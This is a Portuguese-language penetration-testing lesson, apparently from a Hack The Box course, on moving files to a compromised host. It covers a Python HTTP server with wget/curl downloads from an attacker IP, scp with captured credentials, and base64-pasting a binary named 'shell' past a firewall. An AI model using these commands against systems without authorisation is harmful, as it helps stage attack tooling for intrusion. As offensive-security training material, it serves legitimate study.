Durante qualquer exercício de teste de penetração, é provável que precisemos transferir arquivos para o servidor remoto, como scripts de enumeração ou exploits, ou transferir dados de volta para nosso host de ataque. Embora ferramentas como o Metasploit com um shell Meterpreter nos permitam usar o comando `Upload` para carregar um arquivo, precisamos aprender métodos para transferir arquivos com um shell reverso padrão.

## Usando wget

Existem muitos métodos para fazer isso. Um método é executar um [servidor HTTP Python](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) em nossa máquina e, em seguida, usar `wget` ou `cURL` para baixar o arquivo no host remoto. Primeiro, vamos para o diretório que contém o arquivo que precisamos transferir e executamos um servidor HTTP Python nele:

```shell-session
casluxd@htb[/htb]$ cd /tmp
casluxd@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Agora que configuramos um servidor de escuta em nossa máquina, podemos baixar o arquivo no host remoto no qual temos a execução do código:

```shell-session
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```

Observe que usamos nosso IP `10.10.14.1` e a porta em que nosso servidor Python é executado `8000`. Caso o servidor remoto não possua `wget`, podemos utilizar `cURL`para baixar o arquivo:

```shell-session
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```

Observe que usamos o sinalizador `-o` para especificar o nome do arquivo de saída.

## Usando SCP

Outro método para transferir arquivos seria usar `scp`, desde que tenhamos obtido credenciais de usuário ssh no host remoto. Podemos fazê-lo da seguinte forma:

```shell-session
casluxd@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

Observe que especificamos o nome do arquivo local após `scp`, e o diretório remoto será salvo após `:`

## Usando Base64

Em alguns casos, podemos não conseguir transferir o arquivo. Por exemplo, o host remoto pode ter proteções de firewall que nos impedem de baixar um arquivo de nossa máquina. Nesse tipo de situação, podemos usar um truque simples para codificar o arquivo em [base64](https://linux.die.net/man/1/base64)`base64` no formato e, em seguida, podemos colar a string `base64` no servidor remoto e decodificá-la. Por exemplo, se quisermos transferir um arquivo binário chamado `shell`, podemos codificá-lo `base64` da seguinte maneira:

```shell-session
casluxd@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

Agora, podemos copiar essa string`base64`, ir para o host remoto e usar `base64 -d` para decodificá-la e canalizar a saída para um arquivo:

```shell-session
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

## Validando Transferências de Arquivos

Para validar o formato de um arquivo, podemos executar o comando [file](https://linux.die.net/man/1/file) nele:

```shell-session
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

Como podemos ver, quando executamos o comando `file` no arquivo `shell`, ele diz que é um binário ELF, o que significa que o transferimos com sucesso. Para garantir que não estragamos o arquivo durante o processo de codificação/decodificação, podemos verificar seu hash md5. Em nossa máquina, podemos rodar `md5sum` nela:

```shell-session
casluxd@htb[/htb]$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

Agora, podemos ir para o servidor remoto e executar o mesmo comando no arquivo que transferimos:

```shell-session
user@remotehost$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

Como podemos ver, ambos os arquivos possuem o mesmo hash md5, significando que o arquivo foi transferido corretamente. Existem vários outros métodos para transferir arquivos.